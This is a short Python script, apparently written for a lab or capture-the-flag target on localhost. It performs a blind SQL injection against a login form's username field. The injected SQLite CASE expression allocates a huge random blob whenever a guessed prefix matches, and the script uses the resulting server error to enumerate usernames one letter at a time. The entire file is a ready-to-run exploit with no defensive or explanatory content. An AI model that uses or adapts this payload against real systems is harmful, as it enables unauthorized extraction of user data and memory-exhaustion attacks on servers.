import requests

first_part_of_string = "' || (case when (select exists(select username from user where username like '"
second_part_of_string = "')) then (HEX(RANDOMBLOB(1000000000/2))) else '0' end) || '"

usernames = []
sub_usernames = []

def find_next_username_letter(incomplete_username):
    letters_found = 0
    for i in range(97, 123):
        glued = first_part_of_string + incomplete_username + chr(i) + "%" + second_part_of_string
        post_request = requests.post("http://localhost:5000/", data={'username': glued, 'password': ''})
        if(post_request.status_code == 500):
            letters_found += 1
            print("Next letter found: " + incomplete_username + "(" + chr(i) + ")")
            find_next_username_letter(incomplete_username + chr(i))
    if(letters_found == 0):
        usernames.append(incomplete_username)

def find_subusers():
    for i in usernames:
        username_length = len(i)
        for j in range(0, username_length):
            sub_username = i[:j]
            glued = first_part_of_string + sub_username + second_part_of_string
            post_request = requests.post("http://localhost:5000/", data={'username': glued, 'password': ''})
            if(post_request.status_code == 500):
                print("Subuser found: " + sub_username)
                usernames.append(sub_username)

find_next_username_letter("")
find_subusers()

print(usernames)
